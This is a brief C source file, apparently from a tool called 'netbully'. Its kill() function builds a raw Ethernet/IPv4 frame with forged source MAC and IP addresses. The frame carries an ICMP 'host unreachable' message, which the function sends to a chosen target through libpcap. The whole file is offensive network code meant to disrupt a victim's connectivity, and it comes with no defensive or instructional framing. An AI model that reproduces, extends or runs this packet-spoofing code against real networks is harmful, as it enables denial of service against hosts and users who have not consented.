#include "netbully.h"

bool kill(pcap_t* handle, uint8_t* tmac, uint8_t* tip, uint8_t* smac, uint8_t* sip) {
	u_char pkt[42];
	ether_header* eth = (ether_header*)pkt;
	ip_hdr* ip = (ip_hdr*)&pkt[sizeof ether_header];
	icmp_hdr* icmp = (icmp_hdr*)&pkt[sizeof ether_header + sizeof ip_hdr];

	memcpy(eth->dest, tmac, 6);
	memcpy(eth->src, smac, 6);
	eth->type = htons(0x0800);

	ip->ver = 4;
	ip->ihl = sizeof ip_hdr / sizeof uint32_t;
	ip->dscp = 0;
	ip->ecn = 1;
	ip->len = htons(sizeof ip_hdr + sizeof icmp_hdr);
	ip->id = 0;
	ip->flags = 0;
	ip->fOff = 0;
	ip->ttl = 128;
	ip->proto = IPPROTO_ICMP;
	ip->csum = 0;
	memcpy(ip->src, sip, 4);
	memcpy(ip->dest, tip, 4);
	ip->csum = checksum((uint16_t*)ip, sizeof ip_hdr);

	icmp->type = 3;
	icmp->code = 1;
	icmp->csum = 0xfefc;
	icmp->id = 0;
	icmp->seq = 0;

	return (pcap_sendpacket(handle, pkt, 42) != -1);
}